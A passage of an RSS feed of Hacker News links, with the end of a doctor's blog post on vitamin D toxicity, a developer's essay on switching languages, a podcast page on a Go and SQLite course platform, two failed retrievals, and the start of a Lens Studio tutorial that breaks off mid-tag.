often mildly to moderately elevated above normal, up to 11.1 mg/dl (normal for her age would be up to 10.2 mg/dl). The cause of this was unclear, but her doctors did not believe that this incidental finding was relevant to her current issues, and did not pursue it. <strong>Shannon was not taking calcium supplements at all throughout this time, but her levels were still high.</strong> When she emailed me in February 2019, she was desperate for answers and thought the calcium levels might be a clue. </p><p id="viewer-1miap">My specialty is parathyroid disease, which is the most common cause of high calcium. Based on her parathyroid hormone tests, it did not appear that Shannon had parathyroid disease. But she had high calcium levels, and the rise in those levels correlated with the onset of her symptoms. High calcium levels might initially appear to be a good thing, since we need calcium for our bones. But they are not. High blood calcium levels usually indicate a serious illness.</p><div id="viewer-ep36c"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.devaboone.com/post/vitamin-d-part-2-shannon-s-story" data-pin-media="https://static.wixstatic.com/media/3e0600_ab9b4f52fab24f4aaf3be163ee13d0ca~mv2.jpg/v1/fit/w_900,h_434,al_c,q_80/file.png" src="https://static.wixstatic.com/media/3e0600_ab9b4f52fab24f4aaf3be163ee13d0ca~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><p id="viewer-5d4om"><em>Calcium is known for its role in bone health, but its role in the brain and nervous system is just as important. Calcium levels need to be within a small range; anything too high or too low can cause problems.  Image by </em><a href="https://www.bigstockphoto.com/search/?contributor=madrock24" target="_blank" rel="noopener">madrock24</a> on <a href="http://bigstockphoto.com/" target="_blank" rel="noopener"><u>bigstockphoto.com</u></a></p><p id="viewer-115r5">Most patients with high calcium develop fatigue and body aches, and just generally feel bad. They may develop insomnia and palpitations, a feeling like the heart is racing. Some have more severe neurologic symptoms like muscle weakness and problems with balance, and some have psychiatric symptoms like depression and anxiety. Untreated high calcium can also lead to kidney stones, kidney failure, cardiac arrhythmias, headaches, and gastrointestinal problems. Shannon had some of the classic symptoms, as well as what appeared to be more severe “psychiatric” symptoms. I suspected they were all related to her calcium levels. </p><p id="viewer-bac7q">But why was her calcium high? The parathyroid glands exist to regulate calcium, and they do a very good job at it, keeping blood calcium within a tight range. Usually, a problem with calcium indicates a problem with the parathyroids. But over the last few years I have had more patients coming to me with high calcium related to something else: Vitamin D. </p><p id="viewer-6d1js"><strong>Vitamin D is a steroid hormone</strong>, in the same category as sex hormones like estrogen and testosterone, and glucocorticoids like the stress hormone cortisol. Steroid hormones are all made from cholesterol, and looking at their molecular structures, you can see the similarities. </p><div id="viewer-6s0p9"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.devaboone.com/post/vitamin-d-part-2-shannon-s-story" data-pin-media="https://static.wixstatic.com/media/3e0600_1ef7e9201aae4b54be7b21f6f218627e~mv2.png/v1/fit/w_1586,h_972,al_c,q_80/file.png" src="https://static.wixstatic.com/media/3e0600_1ef7e9201aae4b54be7b21f6f218627e~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><p id="viewer-3upia">Like the other steroid hormones, Vitamin D acts on multiple organs and only tiny amounts of the molecule are required to have substantial effects. Anyone who has gone through puberty understands the impressive physiologic changes brought about by relatively small shifts in hormone levels. Not surprisingly, most steroid hormones are considered medications that require a physician's order. Vitamin D is an exception. In the U.S., high dose Vitamin D can be purchased by anyone, without a prescription, in most drugstores and grocery stores. It is called a dietary supplement, which sounds safer than a medication, but this is misleading. Due to its role in calcium absorption, high dose Vitamin D can cause serious problems. </p><p id="viewer-21t00">Eventually we worked out what happened with Shannon: In 2013 she was diagnosed with mild osteopenia, a thinning of the bones that can be a precursor to osteoporosis. Her Vitamin D was low at the time, so her physician started her on over-the-counter Vitamin D supplementation at 5000 international units (IUs) daily. Five years later, she was still on this dose, and her blood Vitamin D level had risen to 79 ng/ml. This level is within what many labs call the normal range, between 30 and 100 ng/ml, but levels above 70 are almost always a result of high dose supplementation, and I have seen toxicity with levels between 70 and 100 ng/ml. (A better “normal range” based on what I have seen would probably be between 30 and 60.) Vitamin D builds up over time, so the longer someone is on a high dose, the more likely she is to develop toxicity. Shannon’s calcium levels began rising in the fall of 2018, when her severe symptoms developed. </p><p id="viewer-c0tav">Ironically, Shannon started to recover because she became too sick to worry about taking her vitamins, and stopped taking Vitamin D in October. It often takes many months for high Vitamin D levels to drop, and it took six months for Shannon’s level to fall into the 50s. As it fell, her calcium level gradually started to normalize, and her symptoms slowly resolved. By May, she was starting to feel like herself again. </p><p id="viewer-208hf">I spoke with Shannon recently. All of the symptoms that characterized her frightening and rapid decline in health had resolved completely. Listening to this animated woman, it was difficult to imagine her unable to talk. The only lingering effects appeared to be a wariness of physicians and distrust of vitamins, both understandable. Shannon agrees that Vitamin D should be treated like a medication. “It’s a hormone!” she exclaimed. “If I had to take ‘Hormone D’, I would have questioned my doctor about why I needed it.” Shannon is now committed to educating others about Vitamin D. </p><p id="viewer-16oc8">Of course, there is a selection bias in who comes to me. There are people out there doing just fine on 5000 units of Vitamin D daily. I only see the ones who develop high calcium levels. But I see enough of them to know that this is not an exceptionally rare occurrence. I have been to lectures in which physicians have claimed that Vitamin D toxicity almost never occurs. In my experience, this is false. I have seen many cases of Vitamin D toxicity in people who were taking the recommended dose from an over-the-counter bottle.</p><p id="viewer-8pgar">Unfortunately, none of those patients were warned about the potential for Vitamin D to cause high calcium. They all believed that they were taking a supplement to improve health and that there was very little risk. Supplements don’t require prescriptions, and most do not have the warning labels that accompany medications. For Vitamin D, a steroid hormone, that may need to change. </p><p id="viewer-4ie1g"><strong>So, how much Vitamin D should you take? </strong></p><p id="viewer-9iecb">Vitamin D should be approached like a medication that is used to treat low calcium levels and low levels of the hormone called Vitamin D. The dose depends on your calcium and current Vitamin D levels, and needs to be adjusted appropriately in response to those levels. For my patients, I can and do give very specific recommendations on Vitamin D doses. In future posts, I can go through how I decide that. I will not give any recommendation without first knowing Vitamin D and calcium levels. </p><p id="viewer-ecd8g"><strong>Edited to add: This post should not be taken as a …</strong></p></div></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.devaboone.com/post/vitamin-d-part-2-shannon-s-story">https://www.devaboone.com/post/vitamin-d-part-2-shannon-s-story</a></em></p>]]>
            </description>
            <link>https://www.devaboone.com/post/vitamin-d-part-2-shannon-s-story</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261124</guid>
            <pubDate>Mon, 24 Aug 2020 14:40:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Tao of Language Agnosticism]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24260892">thread link</a>) | @ntietz
<br/>
August 24, 2020 | https://remesh.blog/the-tao-of-agnosticism-a16ad408dd1e | <a href="https://web.archive.org/web/*/https://remesh.blog/the-tao-of-agnosticism-a16ad408dd1e">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><div><div><div><p><a href="https://remesh.blog/@Lumpy?source=post_page-----a16ad408dd1e----------------------" rel="noopener"><img alt="Will Specht" src="https://miro.medium.com/fit/c/96/96/1*2Z1l6QIgaYLzzSPOI7Guhg.jpeg" width="48" height="48"></a></p></div></div></div></div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/5000/1*OJVNJUHPn8jZd3kT_f_0Lg.jpeg" width="2500" height="1667" srcset="https://miro.medium.com/max/552/1*OJVNJUHPn8jZd3kT_f_0Lg.jpeg 276w, https://miro.medium.com/max/1104/1*OJVNJUHPn8jZd3kT_f_0Lg.jpeg 552w, https://miro.medium.com/max/1280/1*OJVNJUHPn8jZd3kT_f_0Lg.jpeg 640w, https://miro.medium.com/max/1400/1*OJVNJUHPn8jZd3kT_f_0Lg.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*OJVNJUHPn8jZd3kT_f_0Lg.jpeg?q=20"></p></div></div></div></figure><p id="2cbf">A lot of companies boast being tech agnostic in their hiring process. It makes sense, why limit your candidate pool? “Good developers should be able to pick up the small differences across languages quickly, their algorithm knowledge and experience is what we are looking for” they might say. I recently went from being a language agnostic hiring manager, to language agnostic candidate, to language agnostic hiree, to novice Python developer. It was a very interesting process and I have some insights I’d like to share from each part of the journey.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/12000/1*mbZ4d3IzTmi46SzfihlJqw.jpeg" width="6000" height="4000" srcset="https://miro.medium.com/max/552/1*mbZ4d3IzTmi46SzfihlJqw.jpeg 276w, https://miro.medium.com/max/1104/1*mbZ4d3IzTmi46SzfihlJqw.jpeg 552w, https://miro.medium.com/max/1280/1*mbZ4d3IzTmi46SzfihlJqw.jpeg 640w, https://miro.medium.com/max/1400/1*mbZ4d3IzTmi46SzfihlJqw.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*mbZ4d3IzTmi46SzfihlJqw.jpeg?q=20"></p></div></div></div><figcaption>Change is beautiful and inevitable</figcaption></figure><p id="3fe2">In my last role I was heavily involved in the hiring process. I was at a Clojure shop, a small but growing Lisp dialect that compiles to the JVM. Since developers that had ever heard of Clojure, let alone written production code, were difficult to find, we looked for strong developers with any language background. We were also writing ClojureScript on the frontend, so even JavaScript developers were starting from scratch.</p><p id="0499">During an interview, after we worked through whatever modeling or algorithm problem I had given them, I made sure to note ways the problem could have been done if we were using Clojure. There were three different types of reactions to my notes. Some candidates would nod or say that’s interesting. Others would challenge the approach or defend why their native language does it the way it does. The final group would ask more about the features and decisions of Clojure, or even extrapolate ways some features could be used in other problems. I liked these candidates the most, of course.</p><p id="5423">What is probably clear is that the knowledge the candidates had previously was probably one of the worst indicators of how successful they would be writing Clojure code. The most successful developers would embrace the Clojure mindset and dig into its features and idiosyncrasies. Developers that had a harder time migrating, would constantly be thinking about a problem in their native language, then attempt to translate that solution into Clojure.</p><p id="e3a6">This is a fault that got me as well. When I was first learning Django, the ORM was a mystery to me. I would want to do seemingly simple queries that I could write easily in SQL but could not figure out for the life of me, how to do it with the ORM. I thought, easy, I’ll write the SQL query first, then convert it to an ORM query. I found a guide on<a href="https://amitness.com/2018/10/django-orm-for-sql-users/" target="_blank" rel="noopener"> SQL to ORM translations</a>, but it didn’t help. I needed to embrace the ORM mindset. I had to start thinking in the way of the ORM, not translating SQL queries. Once I embraced the ORM, it was a powerful tool that could help me quickly explore data and write more optimized queries.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4480/1*70jocMRU4kpS5nZ9zuft6g.jpeg" width="2240" height="1488" srcset="https://miro.medium.com/max/552/1*70jocMRU4kpS5nZ9zuft6g.jpeg 276w, https://miro.medium.com/max/1104/1*70jocMRU4kpS5nZ9zuft6g.jpeg 552w, https://miro.medium.com/max/1280/1*70jocMRU4kpS5nZ9zuft6g.jpeg 640w, https://miro.medium.com/max/1400/1*70jocMRU4kpS5nZ9zuft6g.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*70jocMRU4kpS5nZ9zuft6g.jpeg?q=20"></p></div></div></div><figcaption>Know who you are</figcaption></figure><p id="d51e">Tooling is another decision to make when embracing a new stack. Do you stick with what you know or take on the tools that are more common for a given language. I was most familiar with IntelliJ as my main IDE. Luckily, Jetbrains also makes PyCharm, a popular Python IDE. I decided to stick with IntelliJ, and a lot of features are identical across the two environments. I was also learning a lot of other tooling, so being at home in my IDE was important. Other tooling and environment changes included: AWS -&gt; GCP, OS X -&gt; Ubuntu, and Sequel Pro -&gt; pgAdmin III. Each of these had their own struggles.</p><p id="5c59">Some of these choices will be made for you. Sequel Pro is OS X only and doesn’t support PostgreSQL. I was forced to move to a new client. A lot of the other developers would use CLI clients, something I’ve never been a fan of. I was happy to embrace new tools, but losing some of my identity as a developer that uses GUIs seemed too far. Luckily I was able to find pgAdmin which allowed for very similar functionality to Sequel Pro. I even started using a few features that don’t exist in Sequel Pro, like scratch pad, since I was open to discovering everything the new tool had to offer.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/10944/1*w7DvYT6j09CmrnSbRHLEVQ.jpeg" width="5472" height="3648" srcset="https://miro.medium.com/max/552/1*w7DvYT6j09CmrnSbRHLEVQ.jpeg 276w, https://miro.medium.com/max/1104/1*w7DvYT6j09CmrnSbRHLEVQ.jpeg 552w, https://miro.medium.com/max/1280/1*w7DvYT6j09CmrnSbRHLEVQ.jpeg 640w, https://miro.medium.com/max/1400/1*w7DvYT6j09CmrnSbRHLEVQ.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*w7DvYT6j09CmrnSbRHLEVQ.jpeg?q=20"></p></div></div></div><figcaption>Some things can not be changed</figcaption></figure><p id="0a44">When learning a new code base, it’s important to understand the decisions that were made when designing it. What was top of mind when different models were created. What mistakes had already been made and what refactors had the code already gone through. Another important aspect to know is what are the future plans for the code base. What areas of the application still need to be refactored? What technologies need to be implemented before we can build a certain feature? Most of these questions can’t be answered by the code itself, it can’t be found on StackOverflow questions or even in library documentation. This information lives in the minds of the developers that built and maintained the code base, and if you are really lucky, the documentation they’ve written about their choices.</p><p id="7c46">During my first few months at Remesh I would be really excited to put up a PR for a medium-sized feature I’d been working on. I’d ask for reviews then see comments and change requests come pouring in. I’m not going to lie, a lot of those early code reviews were rough. Not because I was doing things wrong, sometimes I was, but because I wasn’t aware of a lot of the decisions that had already been made. I didn’t know about conventions that other developers were rightfully trying to follow, to make the codebase more cohesive and easier to comprehend.</p><p id="c731">Some of these changes were small, but others required large rewrites. Had I run my proposed implementation past a few engineers before starting to code, they probably would have brought up ways it wouldn’t fit with the companies coding styles. Doing a quick review beforehand would have saved me a ton of time after the fact. That’s why I pushed hard to implement a formal review process at Remesh, to save other developers from the problems I faced.</p><p id="0ac1">Design reviews are a great way to document all of these choices and make sure they coincide with decisions other developers are making. Our design review structure is pretty simple. A quick summary of the problem you are trying to solve, followed by a list of any solutions you considered and the solution you hope to implement.</p><p id="26d6"><strong>This format has a few benefits:</strong></p><p id="510f">Comparing trade-offs better frames the problem. Reviewers are able to quickly see the proposed solution and comment on why they prefer one solution over another. Seeing solutions the designer didn’t choose can give better insight on what problem the designer is trying to solve. Often the real problem is discovered by the solution that is chosen, or why a seemingly simple problem has such a complex solution.</p><p id="253a">Design reviews are overhead. Though they can drastically increase performance by preventing poor designs that need to be drastically refactored, it is a lot of work writing documentation that may only be reviewed quickly by peers. Listing the nitty details of how the implementation will work can be an unnecessary step. A lot of times these kinds of decisions are better communicated as code. What was considered? Why don’t certain solutions work well? How is this problem different from the other problems that seem similar to this problem? These are the types of questions a design review should be answering.</p><p id="6bb6">It creates clear patterns for the future. There are many ways to skin a cat, good engineering organizations solve problems in similar ways so they can easily be understood by and communicated to, the rest of the organization. This allows multiple developers to work on many parts of the codebase, knowing it will be familiar and follow certain patterns. Design reviews help limit the number of patterns. Unless a problem truly requires a unique solution, we prefer to use a pattern we have used before. Design reviews document these patterns and provide a good list of patterns to choose from.</p></div></div></section></div>]]>
            </description>
            <link>https://remesh.blog/the-tao-of-agnosticism-a16ad408dd1e</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260892</guid>
            <pubDate>Mon, 24 Aug 2020 14:18:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a course platform for 15k users with Go and SQLite on a $5/mo DO server]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24260868">thread link</a>) | @nickjj
<br/>
August 24, 2020 | https://runninginproduction.com/podcast/42-creating-a-video-course-hosting-platform-to-learn-go | <a href="https://web.archive.org/web/*/https://runninginproduction.com/podcast/42-creating-a-video-course-hosting-platform-to-learn-go">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div id="podcast_or_interview"><div> <p><span> Copied URL with current time. </span></p></div><ul><li> <a href="https://runninginproduction.com/tags/golang"> #golang </a></li><li> <a href="https://runninginproduction.com/tags/react"> #react </a></li><li> <a href="https://runninginproduction.com/tags/caddy"> #caddy </a></li><li> <a href="https://runninginproduction.com/tags/convertkit"> #convertkit </a></li><li> <a href="https://runninginproduction.com/tags/digitalocean"> #digitalocean </a></li><li> <a href="https://runninginproduction.com/tags/docker"> #docker </a></li><li> <a href="https://runninginproduction.com/tags/gumroad"> #gumroad </a></li><li> <a href="https://runninginproduction.com/tags/logdna"> #logdna </a></li><li> <a href="https://runninginproduction.com/tags/mailgun"> #mailgun </a></li><li> <a href="https://runninginproduction.com/tags/slack"> #slack </a></li><li> <a href="https://runninginproduction.com/tags/sqlite"> #sqlite </a></li><li> <a href="https://runninginproduction.com/tags/systemd"> #systemd </a></li><li> <a href="https://runninginproduction.com/tags/tailwindcss"> #tailwindcss </a></li><li> <a href="https://runninginproduction.com/tags/ubuntu"> #ubuntu </a></li><li> <a href="https://runninginproduction.com/tags/vimeo"> #vimeo </a></li></ul><p>In this episode of Running in Production, Jon Calhoun talks about building his video course platform with Golang. It’s hosted on a single DigitalOcean droplet and has been up and running in production since 2016.</p><p>Jon covers keeping it simple with a monolithic app that was rewritten a few times, using SQLite as his main database even with 15,000+ active users and spending his innovation tokens wisely.</p><h2 id="topics-include">Topics Include</h2><ul><li> <a href="#" data-audio-seek="88">1:28</a> – Creating a custom platform lets Jon come up with new blog post / course ideas</li><li> <a href="#" data-audio-seek="291">4:51</a> – It has roughly 15,000 active users and he built 2 separate platforms initially</li><li> <a href="#" data-audio-seek="662">11:02</a> – Motivation for using Golang and figuring out when to add new features</li><li> <a href="#" data-audio-seek="797">13:17</a> – Using Gumroad licenses to handle course access for users</li><li> <a href="#" data-audio-seek="919">15:19</a> – It’s a monolithic app that was rewritten a few times to be ~15k LOC</li><li> <a href="#" data-audio-seek="1509">25:09</a> – Sweating over hello world requests per second benchmarks isn’t worth it</li><li> <a href="#" data-audio-seek="1704">28:24</a> – Server rendered templates using Golang’s template package + gotchas</li><li> <a href="#" data-audio-seek="2026">33:46</a> – Using TailwindCSS with PostCSS and Vimeo / YouTube for the videos</li><li> <a href="#" data-audio-seek="2216">36:56</a> – Using Golang’s built in web server and SQLite as a primary database</li><li> <a href="#" data-audio-seek="2340">39:00</a> – Only tracking stats about users that Jon plans to act on</li><li> <a href="#" data-audio-seek="2581">43:01</a> – Caddy sits in front of the Golang web server and deals with SSL certificates</li><li> <a href="#" data-audio-seek="2697">44:57</a> – Docker is being used in the React / PostgreSQL code update</li><li> <a href="#" data-audio-seek="2953">49:13</a> – Working with DigitalOcean block storage volumes and Spaces (S3-like object store)</li><li> <a href="#" data-audio-seek="3323">55:23</a> – The single $5 / month server is running Ubuntu 14.04 LTS and was set up manually</li><li> <a href="#" data-audio-seek="3551">59:11</a> – The deploy process from development to production</li><li> <a href="#" data-audio-seek="3865">1:04:25</a> – Spend your innovation tokens wisely</li><li> <a href="#" data-audio-seek="3982">1:06:22</a> – How Jon assembles his courses with data structures in his source code</li><li> <a href="#" data-audio-seek="4344">1:12:24</a> – Daily backups of the droplet and how Jon deals with logging / errors / email</li><li> <a href="#" data-audio-seek="4689">1:18:09</a> – Best tips? Start simple and really stick to it</li><li> <a href="#" data-audio-seek="4753">1:19:13</a> – Jon is on Twitter at <a href="https://twitter.com/joncalhoun" rel="noopener" target="_blank">@joncalhoun</a> and check out his site at <a href="https://www.calhoun.io/" rel="noopener" target="_blank">https://www.calhoun.io/</a></li></ul><h2 id="links">Links</h2><h6 id="-references">📄 References</h6><ul><li><a href="https://github.com/heartcombo/devise" rel="noopener" target="_blank">https://github.com/heartcombo/devise</a></li><li><a href="https://github.com/gorilla" rel="noopener" target="_blank">https://github.com/gorilla</a></li><li><a href="https://gobuffalo.io/en/" rel="noopener" target="_blank">https://gobuffalo.io/en/</a></li><li><a href="https://mcfunley.com/choose-boring-technology" rel="noopener" target="_blank">https://mcfunley.com/choose-boring-technology</a></li></ul><h6 id="️-tech-stack">⚙️ Tech Stack</h6><ul><li> <a href="https://golang.org/" rel="noopener" target="_blank"> golang → </a></li><li> <a href="https://reactjs.org/" rel="noopener" target="_blank"> react → </a></li><li> <a href="hhttps://caddyserver.com/"> caddy → </a></li><li> <a href="https://convertkit.com/" rel="noopener" target="_blank"> convertkit → </a></li><li> <a href="https://m.do.co/c/0a14c0d916b3" rel="noopener" target="_blank"> digitalocean → </a></li><li> <a href="https://www.docker.com/" rel="noopener" target="_blank"> docker → </a></li><li> <a href="https://gumroad.com/" rel="noopener" target="_blank"> gumroad → </a></li><li> <a href="https://logdna.com/" rel="noopener" target="_blank"> logdna → </a></li><li> <a href="https://www.mailgun.com/" rel="noopener" target="_blank"> mailgun → </a></li><li> <a href="https://slack.com/" rel="noopener" target="_blank"> slack → </a></li><li> <a href="https://www.sqlite.org/index.html" rel="noopener" target="_blank"> sqlite → </a></li><li> <a href="https://www.freedesktop.org/wiki/Software/systemd/" rel="noopener" target="_blank"> systemd → </a></li><li> <a href="https://tailwindcss.com/" rel="noopener" target="_blank"> tailwindcss → </a></li><li> <a href="https://ubuntu.com/" rel="noopener" target="_blank"> ubuntu → </a></li><li> <a href="https://vimeo.com/" rel="noopener" target="_blank"> vimeo → </a></li></ul><h6 id="-libraries-used">🛠 Libraries Used</h6><ul><li><a href="https://github.com/gorilla/mux" rel="noopener" target="_blank">https://github.com/gorilla/mux</a></li><li><a href="https://gorm.io/" rel="noopener" target="_blank">https://gorm.io/</a></li></ul><h2>Support the Show</h2><p>This episode does not have a sponsor and this podcast is a labor of love. If you want to support the show, the best way to do it is to purchase one of my courses or suggest one to a friend.</p><ul><li> <a href="https://diveintodocker.com/?utm_source=nj&amp;utm_medium=rip&amp;utm_campaign=/podcast/42-creating-a-video-course-hosting-platform-to-learn-go" rel="noopener" target="_blank">Dive into Docker</a> is a video course that takes you from not knowing what Docker is to being able to confidently use Docker and Docker Compose for your own apps. Long gone are the days of <i>"but it works on my machine!"</i>. A bunch of follow along labs are included.</li></ul><ul><li> <a href="https://buildasaasappwithflask.com/?utm_source=nj&amp;utm_medium=rip&amp;utm_campaign=/podcast/42-creating-a-video-course-hosting-platform-to-learn-go" rel="noopener" target="_blank">Build a SAAS App with Flask</a> is a video course where we build a real world SAAS app that accepts payments, has a custom admin, includes high test coverage and goes over how to implement and apply 50+ common web app features. There's over 20+ hours of video.</li></ul><h2>Questions</h2><ul><li> Want to discuss this episode on Twitter? Tag <a href="https://twitter.com/nickjanetakis" rel="noopener" target="_blank">@nickjanetakis</a> or <a href="https://twitter.com/joncalhoun" rel="noopener" target="_blank">@joncalhoun</a></li></ul><p>Aug 03, 2020</p><p><a role="button" href="https://github.com/nickjj/runninginproduction.com/edit/master/_posts/podcast/2020-08-03-42-creating-a-video-course-hosting-platform-to-learn-go.md" rel="noopener" target="_blank"> ✏️ Edit on GitHub </a></p></div></div></div></div>]]>
            </description>
            <link>https://runninginproduction.com/podcast/42-creating-a-video-course-hosting-platform-to-learn-go</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260868</guid>
            <pubDate>Mon, 24 Aug 2020 14:16:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why is Gold price rallying in India?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24260825">thread link</a>) | @jafriazhar7
<br/>
August 24, 2020 | http://guideinvestments.com/why-is-gold-price-increasing-in-india/ | <a href="https://web.archive.org/web/*/http://guideinvestments.com/why-is-gold-price-increasing-in-india/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://guideinvestments.com/why-is-gold-price-increasing-in-india/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260825</guid>
            <pubDate>Mon, 24 Aug 2020 14:12:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stroll – A Roam-like experience in a free, downloadable file]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24260789">thread link</a>) | @deegles
<br/>
August 24, 2020 | https://giffmex.org/stroll/stroll.html | <a href="https://web.archive.org/web/*/https://giffmex.org/stroll/stroll.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://giffmex.org/stroll/stroll.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260789</guid>
            <pubDate>Mon, 24 Aug 2020 14:09:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing a custom image segmentation neural network in Snap's Lens Studio]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24260588">thread link</a>) | @austin_kodra
<br/>
August 24, 2020 | https://heartbeat.fritz.ai/building-a-custom-face-mask-snapchat-lens-with-fritz-ai-and-lens-studio-ba541b8ca5ae | <a href="https://web.archive.org/web/*/https://heartbeat.fritz.ai/building-a-custom-face-mask-snapchat-lens-with-fritz-ai-and-lens-studio-ba541b8ca5ae">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><blockquote><p id="a6c7">Note: Lens Studio is a rich toolkit with its own set of terms and naming conventions. Before you start building, I’d suggest <a href="https://lensstudio.snapchat.com/guides/getting-started/" target="_blank" rel="noopener">reviewing a bit of their documentation</a> to help familiarize yourself with the platform.</p></blockquote><p id="0ef3">To get started, go ahead and open up Lens Studio and click on the New Project button. There are lots of useful template projects, but we’ll start with an empty project for now to keep things simple.</p><p id="175e">Let’s first delete the default Camera and Lighting Objects under the Objects panel (which is on the upper left side by default), and the Echopark folder under the Resources panel (which is on the lower left side by default), since we won’t be needing those. Keep in mind that you can go to Window &gt; Panels at any point if you can’t find the panel you are looking for.</p><p id="8b44">To make use of our model, we need to add an ML Component to the project. To do that, click the + sign at the top of the Objects panel, search for “ML”, and select the ML Component.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1112/1*2sAS15tc3BMNR7VSRjJ_Yg.png" width="556" height="322" srcset="https://miro.medium.com/max/552/1*2sAS15tc3BMNR7VSRjJ_Yg.png 276w, https://miro.medium.com/max/1104/1*2sAS15tc3BMNR7VSRjJ_Yg.png 552w, https://miro.medium.com/max/1112/1*2sAS15tc3BMNR7VSRjJ_Yg.png 556w" sizes="556px" data-old-src="https://miro.medium.com/max/60/1*2sAS15tc3BMNR7VSRjJ_Yg.png?q=20"></p></div></div></figure><p id="ac6e">Next, in the system dialogue that pops up, we need to select our trained model .pb file to load it into the ML Component. Lens Studio provides RGB images with values ranging from 0–255 as input, and expects outputs in the range of 0–255 as well (for segmentation models), so you may need to adjust the scale and bias parameters to match your model’s expected inputs and outputs.</p><p id="0717">If you downloaded the .pb file from Fritz AI, the normalization is already baked into the model, so you can leave the scale and bias parameters in Lens Studio at their default values. If you’re doing this manually (possibly with a model you trained yourself), check out my <a target="_blank" rel="noopener" href="https://heartbeat.fritz.ai/exploring-snapml-working-with-custom-neural-networks-in-lens-studio-57459a51cb3d">last post</a> for some tips on integrating the normalization into your model.</p><p id="d69d">If the ML Component appears under a Perspective Camera, move it to the root of the object hierarchy and delete the Perspective Camera.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1112/1*W7Q_w_C-QJgDOKQJpC69tg.gif" width="556" height="644" srcset="https://miro.medium.com/max/552/1*W7Q_w_C-QJgDOKQJpC69tg.gif 276w, https://miro.medium.com/max/1104/1*W7Q_w_C-QJgDOKQJpC69tg.gif 552w, https://miro.medium.com/max/1112/1*W7Q_w_C-QJgDOKQJpC69tg.gif 556w" sizes="556px" data-old-src="https://miro.medium.com/freeze/max/52/1*W7Q_w_C-QJgDOKQJpC69tg.gif?q=20"></p></div></div></figure><p id="c812">Once you import the model, it will show up under the Resources panel. Before we go any further with the model, though, let’s add some preview images (or videos) so we can visualize the model’s predictions once we connect the various pieces of the lens.</p><p id="a53c">To do that, click on the top middle part of the Preview panel (on the right side in the default layout) where it says “Person 1”, click on the “+ From Files” button, and select your image file. Once the file is added, it should appear in the dropdown list where you can select it to use as your preview image.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1332/1*KN4GH982T9ZMnpICeiqvAQ.png" width="666" height="892" srcset="https://miro.medium.com/max/552/1*KN4GH982T9ZMnpICeiqvAQ.png 276w, https://miro.medium.com/max/1104/1*KN4GH982T9ZMnpICeiqvAQ.png 552w, 